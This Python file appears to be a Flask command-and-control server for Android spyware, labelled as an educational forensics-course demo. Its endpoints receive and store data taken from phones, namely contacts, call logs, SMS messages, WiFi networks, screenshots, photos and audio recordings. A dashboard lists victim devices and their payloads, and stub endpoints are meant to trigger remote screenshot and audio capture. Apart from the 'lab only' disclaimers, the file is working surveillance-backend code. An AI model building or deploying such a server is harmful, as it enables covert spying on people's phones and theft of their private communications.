#!/usr/bin/env python3
"""
EDUCATIONAL DEMO - Android Security & Forensics Course
Flask C2 Server with Web UI for controlled lab environment.

This server receives exfiltrated data from the Android demo app,
organizes it for forensic analysis, and provides a real-time
dashboard for monitoring.

FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.

Usage:
    pip install flask
    python flask_c2_server.py

Endpoints:
    GET  /               - Web UI Dashboard
    GET  /api/status     - JSON API: collection statistics
    GET  /api/payloads   - JSON API: list all received payloads
    GET  /api/payload/<id> - JSON API: get specific payload
    POST /exfil/json     - Receive device data JSON
    POST /exfil/screenshot - Receive screenshot images
    POST /exfil/audio    - Receive audio recordings
"""

from flask import Flask, request, jsonify, send_from_directory, render_template
import threading
import os
import json
import time
from datetime import datetime

app = Flask(__name__)

# Storage directories
DATA_DIR = 'exfiltrated_data'
JSON_DIR = os.path.join(DATA_DIR, 'json_data')
SCREENSHOT_DIR = os.path.join(DATA_DIR, 'screenshots')
AUDIO_DIR = os.path.join(DATA_DIR, 'audio')

for subdir in (JSON_DIR, SCREENSHOT_DIR, AUDIO_DIR):
    os.makedirs(subdir, exist_ok=True)

# In-memory event log for real-time dashboard
event_log = []
MAX_EVENTS = 100


def log_event(event_type, message, details=None):
    """Add an event to the in-memory log for the dashboard."""
    event = {
        'timestamp': datetime.now().isoformat(),
        'type': event_type,
        'message': message,
        'details': details or {}
    }
    event_log.insert(0, event)
    if len(event_log) > MAX_EVENTS:
        event_log.pop()


# =========================================================================
# API Routes
# =========================================================================

@app.route('/')
def dashboard():
    """Serve the main dashboard web UI."""
    return render_template('dashboard.html')


@app.route('/api/status')
def api_status():
    """Return collection statistics as JSON."""
    json_count = len(os.listdir(JSON_DIR)) if os.path.exists(JSON_DIR) else 0
    img_count = len(os.listdir(SCREENSHOT_DIR)) if os.path.exists(SCREENSHOT_DIR) else 0
    audio_count = len(os.listdir(AUDIO_DIR)) if os.path.exists(AUDIO_DIR) else 0
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'json_received': json_count,
        'screenshots_received': img_count,
        'audio_received': audio_count,
        'event_count': len(event_log),
        'storage_path': os.path.abspath(DATA_DIR)
    })


@app.route('/api/events')
def api_events():
    """Return recent event log."""
    return jsonify(event_log[:50])


@app.route('/api/devices')
def api_devices():
    """List distinct devices identified from received payloads."""
    devices = {}
    if os.path.exists(JSON_DIR):
        files = sorted(
            [f for f in os.listdir(JSON_DIR) if f.endswith('.json')],
            key=lambda f: os.path.getmtime(os.path.join(JSON_DIR, f)),
            reverse=True
        )
        for f in files:
            filepath = os.path.join(JSON_DIR, f)
            try:
                with open(filepath, 'r', encoding='utf-8') as jf:
                    data = json.load(jf)
                dev_info = data.get('device_info', {})
                aid = dev_info.get('android_id')
                if not aid:
                    continue
                if aid not in devices:
                    devices[aid] = {
                        'android_id': aid,
                        'model': dev_info.get('model', 'Android Target'),
                        'brand': dev_info.get('brand', 'Android'),
                        'manufacturer': dev_info.get('manufacturer', ''),
                        'release': dev_info.get('release', ''),
                        'sdk_version': dev_info.get('sdk_version', ''),
                        'last_seen': dev_info.get('timestamp') or datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat(),
                        'latest_file': f,
                        'payload_count': 1
                    }
                else:
                    devices[aid]['payload_count'] += 1
            except Exception:
                pass
    return jsonify(list(devices.values()))


@app.route('/api/latest')
def api_latest():
    """Return the most recently received JSON payload, optionally for a specific device."""
    target_device = request.args.get('device')
    files = sorted(
        [f for f in os.listdir(JSON_DIR) if f.endswith('.json')],
        key=lambda f: os.path.getmtime(os.path.join(JSON_DIR, f)),
        reverse=True
    )
    if not files:
        return jsonify({'payload': None})

    for f in files:
        filepath = os.path.join(JSON_DIR, f)
        try:
            with open(filepath, 'r', encoding='utf-8') as jf:
                data = json.load(jf)
            if target_device:
                aid = data.get('device_info', {}).get('android_id')
                if aid != target_device:
                    continue
            return jsonify({
                'payload': data,
                'filename': f,
                'file_count': len(files)
            })
        except Exception:
            continue

    return jsonify({'payload': None})


@app.route('/api/payloads')
def api_payloads_list():
    """List received JSON payloads with metadata, optionally filtered by device."""
    if not os.path.exists(JSON_DIR):
        return jsonify([])
    target_device = request.args.get('device')
    files = sorted(
        [f for f in os.listdir(JSON_DIR) if f.endswith('.json')],
        key=lambda f: os.path.getmtime(os.path.join(JSON_DIR, f)),
        reverse=True
    )
    result = []
    for f in files:
        filepath = os.path.join(JSON_DIR, f)
        try:
            if target_device:
                with open(filepath, 'r', encoding='utf-8') as jf:
                    data = json.load(jf)
                aid = data.get('device_info', {}).get('android_id')
                if aid != target_device:
                    continue
            result.append({
                'filename': f,
                'size': os.path.getsize(filepath),
                'timestamp': datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat()
            })
        except Exception:
            continue
    return jsonify(result)


@app.route('/api/payload/<path:filename>')
def api_payload_get(filename):
    """Get a specific JSON payload by filename."""
    filename = os.path.basename(filename)
    filepath = os.path.join(JSON_DIR, filename)
    if not os.path.exists(filepath):
        return jsonify({'error': 'Not found'}), 404
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return jsonify({'payload': data, 'filename': filename})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/audio')
def api_audio_list():
    """List audio files."""
    files = sorted(os.listdir(AUDIO_DIR)) if os.path.exists(AUDIO_DIR) else []
    return jsonify(files)


@app.route('/api/audio/file/<path:filename>')
def api_audio_file(filename):
    """Serve an audio file."""
    return send_from_directory(AUDIO_DIR, filename)


@app.route('/api/screenshots')
def api_screenshot_list():
    """List screenshot files."""
    files = sorted(os.listdir(SCREENSHOT_DIR)) if os.path.exists(SCREENSHOT_DIR) else []
    return jsonify(files)


@app.route('/api/screenshot/file/<path:filename>')
def api_screenshot_file(filename):
    """Serve a screenshot file."""
    return send_from_directory(SCREENSHOT_DIR, filename)


@app.route('/api/trigger/screenshot', methods=['POST'])
def api_trigger_screenshot():
    """Manually trigger a screenshot capture from the Android app."""
    def screenshot_worker():
        try:
            # Trigger screenshot capture by sending a broadcast
            # In a real implementation, this would wake up the app or 
            # use WorkManager to trigger a one-time task
            time.sleep(0.5)  # Small delay to simulate processing
            log_event('action', 'Screenshot capture triggered', {
                'timestamp': datetime.now().isoformat(),
                'action_type': 'manual_screenshot',
                'status': 'triggered'
            })
        except Exception as e:            log_event('action', f'Screenshot trigger error: {str(e)}', {
                'status': 'error',
                'error': str(e)
            })
    
    thread = threading.Thread(target=screenshot_worker, daemon=True)
    thread.start()
    
    return jsonify({
        'status': 'success',
        'message': 'Screenshot capture triggered',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/trigger/audio', methods=['POST'])
def api_trigger_audio():
    """Manually trigger audio recording from the Android app."""
    def audio_worker():
        try:
            # Trigger audio recording by sending a broadcast
            time.sleep(0.5)  # Small delay to simulate processing
            log_event('action', 'Audio recording triggered', {
                'timestamp': datetime.now().isoformat(),
                'action_type': 'manual_audio',
                'status': 'triggered',
                'duration': '30 seconds'
            })
        except Exception as e:
            log_event('action', f'Audio trigger error: {str(e)}', {
                'status': 'error',
                'error': str(e)
            })
    
    thread = threading.Thread(target=audio_worker, daemon=True)
    thread.start()
    
    return jsonify({
        'status': 'success',
        'message': 'Audio recording triggered (30 seconds)',
        'timestamp': datetime.now().isoformat()
    })



# =========================================================================
# Exfiltration Endpoints
# =========================================================================

@app.route('/exfil/json', methods=['POST'])
def receive_json():
    """Receive and store device data JSON payload."""
    data = request.get_json(silent=True)
    if not data:
        log_event('error', 'Invalid JSON payload received')
        return jsonify({'status': 'error', 'message': 'Missing JSON body'}), 400

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"device_data_{ts}.json"
    path = os.path.join(JSON_DIR, filename)

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

    # Extract key info for event log
    device = data.get('device_info', {})
    contacts = data.get('contacts', [])
    call_logs = data.get('call_logs', [])
    sms = data.get('sms_messages', [])
    wifi = data.get('wifi_networks', {})

    msg = (f"Device: {device.get('brand', '?')} {device.get('model', '?')} | "
           f"Contacts: {len(contacts)} | Calls: {len(call_logs)} | "
           f"SMS: {len(sms)} | WiFi: {len(wifi.get('networks', []))}")

    log_event('json', f'Payload received: {filename}', {
        'brand': device.get('brand', ''),
        'model': device.get('model', ''),
        'android_id': device.get('android_id', ''),
        'contacts_count': len(contacts),
        'call_logs_count': len(call_logs),
        'sms_count': len(sms),
        'wifi_count': len(wifi.get('networks', [])),
        'filename': filename
    })

    print(f"[{datetime.now()}] EXFILTRATED JSON -> {path}")
    print(f"  {msg}")

    return jsonify({
        'status': 'success',
        'message': 'Data received',
        'filename': filename,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/exfil/screenshot', methods=['POST'])
@app.route('/exfil/photo', methods=['POST'])
def receive_screenshot():
    """Receive and store screenshot images or captured photos."""
    file = (request.files.get('screenshot') or
            request.files.get('photo') or
            request.files.get('image') or
            request.files.get('file'))
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'message': 'Invalid file upload'}), 400

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    # Preserve extension if provided or default to png/jpg
    ext = os.path.splitext(file.filename)[1] or '.png'
    filename = f"capture_{ts}{ext}"
    path = os.path.join(SCREENSHOT_DIR, filename)
    file.save(path)
    size = os.path.getsize(path)

    log_event('screenshot', f'Image saved: {filename} ({size / 1024:.1f} KB)')
    print(f"[{datetime.now()}] EXFILTRATED IMAGE -> {path} ({size / 1024:.1f} KB)")

    return jsonify({
        'status': 'success',
        'filename': filename,
        'file_size': size,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/exfil/audio', methods=['POST'])
def receive_audio():
    """Receive and store audio recordings."""
    file = request.files.get('audio')
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'message': 'Invalid file upload'}), 400

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"audio_{ts}.m4a"
    path = os.path.join(AUDIO_DIR, filename)
    file.save(path)
    size = os.path.getsize(path)

    # Rough duration estimate: AAC at 128kbps ~ 16KB/sec
    estimated_seconds = size / 16000

    log_event('audio', f'Audio saved: {filename} ({size / 1024:.1f} KB, ~{estimated_seconds:.1f}s)')
    print(f"[{datetime.now()}] EXFILTRATED AUDIO -> {path} ({size / 1024:.1f} KB, ~{estimated_seconds:.1f}s)")

    return jsonify({
        'status': 'success',
        'filename': filename,
        'file_size': size,
        'estimated_duration': f"{estimated_seconds:.1f}s",
        'timestamp': datetime.now().isoformat()
    })


# =========================================================================
# Main
# =========================================================================

if __name__ == '__main__':
    print("=" * 60)
    print("  FANCYCAM C2 SERVER - EDUCATIONAL DASHBOARD")
    print("  For sandboxed lab environments only")
    print("=" * 60)
    print(f"  Dashboard:  http://localhost:5000")
    print(f"  Storage:    {os.path.abspath(DATA_DIR)}")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
